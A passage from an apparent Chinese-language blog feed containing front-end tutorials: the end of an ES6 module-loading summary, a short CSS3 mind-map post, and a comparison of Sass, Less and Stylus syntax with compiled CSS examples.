module.loadPageInto(main); </span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(err =&gt; &#123; </span><br><span class="line">    main.textContent = err.message; </span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><h4 id="适用场合"><a href="#适用场合" class="headerlink" title="适用场合"></a>适用场合</h4><ul><li>按需加载: import() 可以在需要的时候，再加载某个模块。</li><li>条件加载：import() 可以放在 if 代码块，根据不同的情况，加载不同的模块。</li><li>动态的模块路径：import() 允许模块路径动态生成。</li></ul><h2 id="Module-的加载实现"><a href="#Module-的加载实现" class="headerlink" title="Module 的加载实现"></a>Module 的加载实现</h2><h3 id="加载规则"><a href="#加载规则" class="headerlink" title="加载规则"></a>加载规则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;module&quot; src=&quot;foo.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="ES6-模块与-CommonJS-模块的差异"><a href="#ES6-模块与-CommonJS-模块的差异" class="headerlink" title="ES6 模块与 CommonJS 模块的差异"></a>ES6 模块与 CommonJS 模块的差异</h3><ul><li>CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。</li><li>CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。</li></ul><h3 id="Node-加载"><a href="#Node-加载" class="headerlink" title="Node 加载"></a>Node 加载</h3><ul><li>在 Node 环境中，使用 import 命令加载 CommonJS 模块，Node 会自动将 module.exports 属性，当作模块的默认输出，即等同于 export default 。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// a.js </span><br><span class="line">module.exports = &#123; </span><br><span class="line">  foo: &apos;hello&apos;, </span><br><span class="line">  bar: &apos;world&apos; </span><br><span class="line">&#125;;</span><br><span class="line">// 等同于 </span><br><span class="line">export default &#123; </span><br><span class="line">  foo: &apos;hello&apos;, </span><br><span class="line">  bar: &apos;world&apos; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>采用 require 命令加载 ES6 模块时，ES6 模块的所有输出接口，会成为输入对象的属性。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// es.js </span><br><span class="line">export let foo = &#123;bar:&apos;my-default&apos;&#125;; </span><br><span class="line">export &#123;foo as bar&#125;; </span><br><span class="line">export function f() &#123;&#125;; </span><br><span class="line">export class c &#123;&#125;; </span><br><span class="line"></span><br><span class="line">// cjs.js </span><br><span class="line">const es_namespace = require(&apos;./es&apos;); </span><br><span class="line">// es_namespace = &#123; </span><br><span class="line">//   get foo() &#123;return foo;&#125; </span><br><span class="line">//   get bar() &#123;return foo;&#125; </span><br><span class="line">//   get f() &#123;return f;&#125; </span><br><span class="line">//   get c() &#123;return c;&#125; </span><br><span class="line">// &#125;</span><br></pre></td></tr></table></figure><h3 id="循环加载"><a href="#循环加载" class="headerlink" title="循环加载"></a>循环加载</h3><p>“循环加载”（circular dependency）指的是， a 脚本的执行依赖 b 脚本，而 b 脚本的执行又依赖 a 脚本。</p><h4 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h4><p>CommonJS 模块的重要特性是加载时执行，即脚本代码在 require 的时候，就会全部执行。一旦出现某个模块被”循环加载”，就只输出已经执行的部分，还未执行的部分不会输出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// a.js</span><br><span class="line">exports.done = false; </span><br><span class="line">var b = require(&apos;./b.js&apos;); </span><br><span class="line">console.log(&apos;在 a.js 之中，b.done = %j&apos;, b.done); </span><br><span class="line">exports.done = true; </span><br><span class="line">console.log(&apos;a.js 执行完毕&apos;);</span><br><span class="line"></span><br><span class="line">// b.js</span><br><span class="line">exports.done = false; </span><br><span class="line">var a = require(&apos;./a.js&apos;); </span><br><span class="line">console.log(&apos;在 b.js 之中，a.done = %j&apos;, a.done); </span><br><span class="line">exports.done = true; </span><br><span class="line">console.log(&apos;b.js 执行完毕&apos;);</span><br><span class="line"></span><br><span class="line">// main.js</span><br><span class="line">var a = require(&apos;./a.js&apos;); </span><br><span class="line">var b = require(&apos;./b.js&apos;); </span><br><span class="line">console.log(&apos;在 main.js 之中, a.done=%j, b.done=%j&apos;, a.done, b.do ne);</span><br><span class="line"></span><br><span class="line">$ node main.js </span><br><span class="line"></span><br><span class="line">在 b.js 之中，a.done = false </span><br><span class="line">b.js 执行完毕 </span><br><span class="line">在 a.js 之中，b.done = true </span><br><span class="line">a.js 执行完毕 </span><br><span class="line">在 main.js 之中, a.done=true, b.done=true</span><br></pre></td></tr></table></figure></p><h4 id="ES6-模块"><a href="#ES6-模块" class="headerlink" title="ES6 模块"></a>ES6 模块</h4><p>ES6加载的变量，都是动态引用 其所在的模块。只要引用存在，代码就能执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// even.js</span><br><span class="line">import &#123; odd &#125; from &apos;./odd&apos; </span><br><span class="line">export var counter = 0; </span><br><span class="line">export function even(n) &#123; </span><br><span class="line">  counter++; </span><br><span class="line">  return n == 0 || odd(n - 1); </span><br><span class="line">&#125;</span><br><span class="line">// odd.js </span><br><span class="line">import &#123; even &#125; from &apos;./even&apos;; </span><br><span class="line">export function odd(n) &#123; </span><br><span class="line">  return n != 0 &amp;&amp; even(n - 1); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ babel-node &gt; import * as m from &apos;./even.js&apos;; </span><br><span class="line">&gt; m.even(10); </span><br><span class="line">true </span><br><span class="line">&gt; m.counter </span><br><span class="line">6</span><br><span class="line">&gt; m.even(20) </span><br><span class="line">true </span><br><span class="line">&gt; m.counter </span><br><span class="line">17</span><br></pre></td></tr></table></figure></p><h3 id="ES6模块的转码"><a href="#ES6模块的转码" class="headerlink" title="ES6模块的转码"></a>ES6模块的转码</h3><p>它是一个垫片库（polyfill），可以在浏览器内加载 ES6 模块、AMD 模块和 CommonJS 模块，将其转为 ES5 格式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;system.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt; </span><br><span class="line">  System.import(&apos;./app.js&apos;); </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近拜读了阮一峰老师的ES6详解，虽然ES9已经大摇大摆亮相，但是ES6依然是一个跨时代的版本，其中不乏很多目前使用率颇高，功能性能上大为改进的新语法，所以还是决定对ES6做一个学习总结，也对其中部分闪光语法做详细解释。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="JS" scheme="http://dangoying.ink/tags/JS/"/>
    
      <category term="ES6" scheme="http://dangoying.ink/tags/ES6/"/>
    
  </entry>
  
  <entry>
    <title>CSS3知识点梳理</title>
    <link href="http://dangoying.ink/CSS3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86.html"/>
    <id>http://dangoying.ink/CSS3知识点梳理.html</id>
    <published>2019-08-31T14:07:46.000Z</published>
    <updated>2019-08-31T14:09:48.218Z</updated>
    
    <content type="html"><![CDATA[<p>本文对CSS3核心知识点，做了思维导图，便于记忆梳理。</p><a id="more"></a><p><img src="../assets/20190831/css3.png" alt="Alt text"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文对CSS3核心知识点，做了思维导图，便于记忆梳理。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="CSS" scheme="http://dangoying.ink/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>SASS,LESS,Stylus哪家强</title>
    <link href="http://dangoying.ink/SASS-LESS-Stylus%E5%93%AA%E5%AE%B6%E5%BC%BA.html"/>
    <id>http://dangoying.ink/SASS-LESS-Stylus哪家强.html</id>
    <published>2019-08-30T08:41:14.000Z</published>
    <updated>2019-08-30T15:58:57.638Z</updated>
    
    <content type="html"><![CDATA[<p>俗话说得好，“人靠衣装，佛靠金装”，对于一个页面来说，美观与否，CSS起着重大的作用，而随着越来越多的使用，CSS也暴露出不少缺陷：</p><ul><li>语法不够强大，比如无法嵌套书写导致模块化开发中需要书写很多重复的选择器</li><li>没有变量和合理的样式复用机制，使得逻辑上相关的属性值必须以字面量的形式重复输出，导致难以维护</li></ul><p>于是，CSS预处理器就诞生了。CSS预处理器用一种专门的编程语言，进行Web页面样式设计，然后再编译成正常的CSS文件，以供项目使用。CSS预处理器为CSS增加一些编程的特性，无需考虑浏览器的兼容性问题。<br>本文将主要介绍 Sass、Less 和 Stylus 这三种 css 预处理器，并比较分析他们的区别。</p><a id="more"></a><h2 id="Sass-Scss、Less、stylus是什么"><a href="#Sass-Scss、Less、stylus是什么" class="headerlink" title="Sass/Scss、Less、stylus是什么?"></a>Sass/Scss、Less、stylus是什么?</h2><ul><li>Sass：Sass是一种动态样式语言，语法属于缩排语法，是最早也是最成熟的CSS预处理器，拥有ruby社区的支持和compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS。</li><li>Less：Less也是一种动态样式语言. 受Sass影响较大,对CSS赋予了动态语言的特性，如变量，继承，运算， 函数。Less既可以在客户端上运行 (支持IE 6+, Webkit, Firefox)，也可在服务端运行(借助 Node.js)。</li><li>Stylus：2010年产生于node社区， 主要用来给Node项目进行CSS预处理支持，人气不如前两者Stylus被称为是一种革命性的新语言，提供一个高效、动态、和使用表达方式来生成CSS，以供浏览器使用。Stylus同时支持缩进和CSS常规样式书写规则。需要安装nodeStylus的语法花样多一些，它的文件扩展名是“.styl”，Stylus也接受标准的CSS语法，但是他也像Sass老的语法规则，使用缩进控制，同时Stylus也接受不带大括号({})和分号的语法。</li></ul><h2 id="Sass-Scss、Less、stylus的区别"><a href="#Sass-Scss、Less、stylus的区别" class="headerlink" title="Sass/Scss、Less、stylus的区别"></a>Sass/Scss、Less、stylus的区别</h2><h3 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h3><p>Sass的安装需要Ruby环境，是在服务端处理的，而Less是需要引入less.js来处理Less代码输出css到浏览器，也可以在开发环节使用Less，然后编译成css文件，直接放到项目中，也有 Less.app、SimpleLess、CodeKit.app这样的工具，也有在线编译地址。Stylus需要安装node，然后安装最新的stylus包即可使用。</p><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><h4 id="Sass"><a href="#Sass" class="headerlink" title="Sass"></a>Sass</h4><p>变量以 <code>$</code> 符号开始，赋值像设置CSS属性那样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$width: 5em;</span><br><span class="line">#main &#123;</span><br><span class="line">  width: $width;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#main &#123;</span><br><span class="line">  width: 5em;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>变量支持块级作用域，嵌套规则内定义的变量只能在嵌套规则内使用（局部变量），不在嵌套规则内定义的变量则可在任何地方使用（全局变量）。将局部变量转换为全局变量可以添加 !global 声明。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#main &#123;</span><br><span class="line">  $width: 5em !global;</span><br><span class="line">  width: $width;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#sidebar &#123;</span><br><span class="line">  width: $width;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#main &#123;</span><br><span class="line">  width: 5em;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#sidebar &#123;</span><br><span class="line">  width: 5em;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h4><p>变量以 <code>@</code> 符号开始，赋值像设置CSS属性那样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@width: 10px;</span><br><span class="line">@height: @width + 10px;</span><br><span class="line"></span><br><span class="line">#header &#123;</span><br><span class="line">  width: @width;</span><br><span class="line">  height: @height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#header &#123;</span><br><span class="line">  width: 10px;</span><br><span class="line">  height: 20px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>变量是延迟加载的，在使用前不一定要预先声明。在定义一个变量两次时，只会使用最后定义的变量，Less会从当前作用域中向上搜索。这个行为类似于CSS的定义中始终使用最后定义的属性值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@var: 0;</span><br><span class="line">.class &#123;</span><br><span class="line">  @var: 1;</span><br><span class="line">  .brass &#123;</span><br><span class="line">    @var: 2;</span><br><span class="line">    three: @var;</span><br><span class="line">    @var: 3;</span><br><span class="line">  &#125;</span><br><span class="line">  one: @var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.class &#123;</span><br><span class="line">  one: 1;</span><br><span class="line">&#125;</span><br><span class="line">.class .brass &#123;</span><br><span class="line">  three: 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Stylus"><a href="#Stylus" class="headerlink" title="Stylus"></a>Stylus</h4><p>没有特殊的要求,可以使用 <code>$</code> 符号开头。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">font-size = 14px</span><br><span class="line">font = font-size &quot;Lucida Grande&quot;, Arial</span><br><span class="line">body</span><br><span class="line">  font font, sans-serif</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  font: 14px &quot;Lucida Grande&quot;, Arial, sans-serif;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="插值语句"><a href="#插值语句" class="headerlink" title="插值语句"></a>插值语句</h3><h4 id="Sass-1"><a href="#Sass-1" class="headerlink" title="Sass"></a>Sass</h4><p>通过 <code>#{}</code> 插值语句可以在选择器或属性名中使用变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$name: foo;</span><br><span class="line">$attr: border;</span><br><span class="line">p.#&#123;$name&#125; &#123;</span><br><span class="line">  #&#123;$attr&#125;-color: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.foo &#123;</span><br><span class="line">  border-color: blue; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less"></a>Less</h4><p>通过 <code>{}</code> 插值语句可以在选择器或属性名中使用变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@mySelector: banner;</span><br><span class="line">.@&#123;mySelector&#125; &#123;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">  line-height: 40px;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.banner &#123;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">  line-height: 40px;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Stylus-1"><a href="#Stylus-1" class="headerlink" title="Stylus"></a>Stylus</h4><p>Stylus支持通过使用{}字符包围表达式来插入值，其会变成标识符的一部分。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vendor(prop,args)</span><br><span class="line">  -webkit-&#123;prop&#125; args</span><br><span class="line">  -moz-&#123;prop&#125; args</span><br><span class="line">  &#123;prop&#125; args</span><br><span class="line">border-radius()</span><br><span class="line">  vendor(&apos;border-radius&apos;,arguments)</span><br><span class="line">button</span><br><span class="line">  border-radius 1px 2px / 3px 4px</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">button &#123;</span><br><span class="line">  -webkit-border-radius: 1px 2px / 3px 4px;</span><br><span class="line">  -moz-border-radius: 1px 2px / 3px 4px;</span><br><span class="line">  border-radius: 1px 2px / 3px 4px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><p>在嵌套上，三种选择器基本一致，没有太大区别。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a &#123;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">  &amp;:hover &#123; text-decoration: underline; &#125;</span><br><span class="line">  body.firefox &amp; &#123; font-weight: normal; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a &#123;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">  text-decoration: none; </span><br><span class="line">&#125;</span><br><span class="line">a:hover &#123;</span><br><span class="line">  text-decoration: underline; </span><br><span class="line">&#125;</span><br><span class="line">body.firefox a &#123;</span><br><span class="line">  font-weight: normal; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Sass还提供一种属性嵌套功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.funky &#123;</span><br><span class="line">  font: &#123;</span><br><span class="line">    family: fantasy;</span><br><span class="line">    size: 30em;</span><br><span class="line">    weight: bold;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.funky &#123;</span><br><span class="line">  font-family: fantasy;</span><br><span class="line">  font-size: 30em;</span><br><span class="line">  font-weight: bold; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h4 id="Sass-2"><a href="#Sass-2" class="headerlink" title="Sass"></a>Sass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.error &#123;</span><br><span class="line">  border: 1px #f00;</span><br><span class="line">  background-color: #fdd;</span><br><span class="line">&#125;</span><br><span class="line">.attention &#123;</span><br><span class="line">  font-size: 3em;</span><br><span class="line">  background-color: #ff0;</span><br><span class="line">&#125;</span><br><span class="line">.seriousError &#123;</span><br><span class="line">  @extend .error;</span><br><span class="line">  @extend .attention;</span><br><span class="line">  border-width: 3px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.error, .seriousError &#123;</span><br><span class="line">  border: 1px #f00;</span><br><span class="line">  background-color: #fdd; </span><br><span class="line">&#125;</span><br><span class="line">.attention, .seriousError &#123;</span><br><span class="line">  font-size: 3em;</span><br><span class="line">  background-color: #ff0; </span><br><span class="line">&#125;</span><br><span class="line">.seriousError &#123;</span><br><span class="line">  border-width: 3px; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less"></a>Less</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nav ul &#123;</span><br><span class="line">  &amp;:extend(.inline);</span><br><span class="line">  background: blue;</span><br><span class="line">&#125;</span><br><span class="line">.inline &#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nav ul &#123;</span><br><span class="line">  background: blue;</span><br><span class="line">&#125;</span><br><span class="line">.inline,</span><br><span class="line">nav ul &#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Stylus-2"><a href="#Stylus-2" class="headerlink" title="Stylus"></a>Stylus</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form</span><br><span class="line">  input[type=text]</span><br><span class="line">  padding: 5px</span><br><span class="line">  border: 1px solid #eee</span><br><span class="line">  color: #ddd</span><br><span class="line"></span><br><span class="line">textarea</span><br><span class="line">  @extends form input[type=text]</span><br><span class="line">  padding: 10px</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form input[type=text],</span><br><span class="line">textarea &#123;</span><br><span class="line">  padding: 5px;</span><br><span class="line">  border: 1px solid #eee;</span><br><span class="line">  color: #ddd;</span><br><span class="line">&#125;</span><br><span class="line">textarea &#123;</span><br><span class="line">  padding: 10px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="混入-Mixins"><a href="#混入-Mixins" class="headerlink" title="混入 (Mixins)"></a>混入 (Mixins)</h3><h4 id="Sass-3"><a href="#Sass-3" class="headerlink" title="Sass"></a>Sass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@mixin sexy-border($color, $width: 1in) &#123;</span><br><span class="line">  border: &#123;</span><br><span class="line">    color: $color;</span><br><span class="line">    width: $width;</span><br><span class="line">    style: dashed;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">p &#123; @include sexy-border(blue); &#125;</span><br><span class="line">h1 &#123; @include sexy-border(blue, 2in); &#125;</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p &#123;</span><br><span class="line">  border-color: blue;</span><br><span class="line">  border-width: 1in;</span><br><span class="line">  border-style: dashed; </span><br><span class="line">&#125;</span><br><span class="line">h1 &#123;</span><br><span class="line">  border-color: blue;</span><br><span class="line">  border-width: 2in;</span><br><span class="line">  border-style: dashed; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less"></a>Less</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.my-mixin &#123;</span><br><span class="line">  color: black;</span><br><span class="line">&#125;</span><br><span class="line">.my-other-mixin() &#123;</span><br><span class="line">  background: white;</span><br><span class="line">&#125;</span><br><span class="line">.class &#123;</span><br><span class="line">  .my-mixin;</span><br><span class="line">  .my-other-mixin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为：<br><figure 